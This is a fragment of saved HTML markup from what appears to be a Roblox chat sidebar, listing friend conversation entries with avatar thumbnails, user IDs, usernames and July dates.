<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-46201DFAE1C5FBFF796ED239AB2D70C6-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="7056107357" title="7056107357" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-46201DFAE1C5FBFF796ED239AB2D70C6-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
ayampedas
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 23
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-872d2539-6d3e-505e-b17e-11d5c66ded61">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="854878719" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="854878719">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="854878719">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0059AD2F0FF16E5C9D16C8DE58BF9A28-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="854878719" title="854878719" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0059AD2F0FF16E5C9D16C8DE58BF9A28-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding unread" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
athxzr06
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope font-bold secondary unread" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 22
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

<span class="xsmall text-overflow text-info font-caption-body chat-friend-message ng-binding ng-scope unread" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="chatUser.previewMessage && !chatUser.isUserPending">
 ngke 
</span>

                                                
<!-- end ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-1298184548">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="1298184548" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="1298184548">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="1298184548">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E094EFE076671E97E350C73740B6479C-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="1298184548" title="1298184548" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E094EFE076671E97E350C73740B6479C-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status game" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
M2KKaizen
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 22
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-2971459352">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="2971459352" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="2971459352">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="2971459352">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-164A99E03F82B826917C1FB5BEDBA7AA-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="2971459352" title="2971459352" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-164A99E03F82B826917C1FB5BEDBA7AA-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
garamfilter
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 22
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-8205580972">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8205580972" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8205580972">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8205580972">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-4D736532156A2AC6691837B5F1BFDF07-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8205580972" title="8205580972" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-4D736532156A2AC6691837B5F1BFDF07-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
Nan
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 21
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-8015598764">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8015598764" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8015598764">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8015598764">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7C85584849C81009C4DD9CD3D348090E-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8015598764" title="8015598764" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7C85584849C81009C4DD9CD3D348090E-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
AL_FAr
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 18
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-1591882673">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="1591882673" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="1591882673">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="1591882673">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-B6484CBA23776A20E4F1C03B2FE4C1EF-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="1591882673" title="1591882673" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-B6484CBA23776A20E4F1C03B2FE4C1EF-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
MrNoobGamer96
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 18
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-8712239177">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8712239177" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8712239177">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8712239177">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7A34D6643F2D3684AC0132DA9A948143-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8712239177" title="8712239177" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7A34D6643F2D3684AC0132DA9A948143-Png/48/48/AvatarHeadshot/Webp/noFilter">

<!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->
 
<!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() -->
 
</span>
                                            
</thumbnail-2d>

                                            
</span>

                                            
<div class="avatar-status chat-friend-status" ng-class="userPresenceTypes[chatLibrary.friendsDict[chatUser.displayUserId].presence.userPresenceType]['className']">
 
</div>

                                        
</div>

                                        
<div ng-controller="userConversationInfoController" user-conversation-info="" class="ng-scope">

                                            
<div class="border-bottom chat-friend-info" ng-class="{'has-universe': isGameAvailableInChat()}">

                                                
<div class="chat-friend-info-top dynamic-overflow-container">
 
<span class="small text-title text-overflow font-caption-header chat-friend-name dynamic-ellipsis-item ng-binding read" ng-class="{'unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-bind="chatUser.title  || chatUser.name ">
Awaa
</span>
                                                    
</div>

                                                
<!-- ngIf: !isGameAvailableInChat() -->

<span class="xsmall text-info chat-brief-timestamp ng-binding ng-scope read" ng-class="{'font-bold secondary unread': shouldShowUnread(), 'read': !shouldShowUnread()}" ng-if="!isGameAvailableInChat()" ng-bind="chatUser.previewMessage.briefTimeStamp || chatUser.briefTimeStamp">
Jul 18
</span>

                                                
<!-- end ngIf: !isGameAvailableInChat() -->

                                                
<!-- ngIf: chatUser.previewMessage && !chatUser.isUserPending -->

                                            
</div>

                                            
<!-- ngIf: isGameAvailableInChat() -->

                                        
</div>

                                    
</div>

                                    
<!-- end ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<!-- ngIf: chatUser.dialogType === dialogType.GROUPCHAT -->

                                
</li>

                                
<!-- end ngRepeat: chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search -->

                                
<li ng-repeat="chatUser in chatUserDict | orderList: chatLibrary.chatLayoutIds | filter : search" class="chat-friend chat-friend-ced59776-b279-5899-afbf-19cc812b85f9">

                                    
<!-- ngIf: chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND -->

                                    
<div ng-if="chatUser.dialogType === dialogType.CHAT || chatUser.dialogType === dialogType.FRIEND" class="chat-friend-container ng-scope" ng-click="launchFromConversationList(chatUser.layoutId)">

                                        
<div class="avatar avatar-headshot-sm card-plain chat-friend-avatar" ng-click="launchFromConversationList(chatUser.layoutId)">
 
<span class="chat-avatar-headshot ng-isolate-scope" class-name="avatar-card-image chat-avatar" chat-avatar-headshot="" user-id="8926978637" layout-library="chatLibrary.layoutLibrary">

<thumbnail-2d thumbnail-target-id="userId" thumbnail-type="layoutLibrary.thumbnailTypes.avatarHeadshot" thumbnail-options="{size: layoutLibrary.avatarHeadshotSize.size48}" class="avatar-card-image chat-avatar" alt-name="userId" title="8926978637">

<span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="8926978637">
 
<!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() -->

<img ng-if="$ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled()" ng-src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-6BAD55EF59492D66570BE04DDB481686-Png/48/48/AvatarHeadshot/Webp/noFilter" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl && !isLoaded }" image-load="" alt="8926978637" title="8926978637" class="ng-scope ng-isolate-scope" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-6BAD55EF59492D66570BE04DDB481686-Png/48/48/AvatarHeadshot/Webp/noFilter">

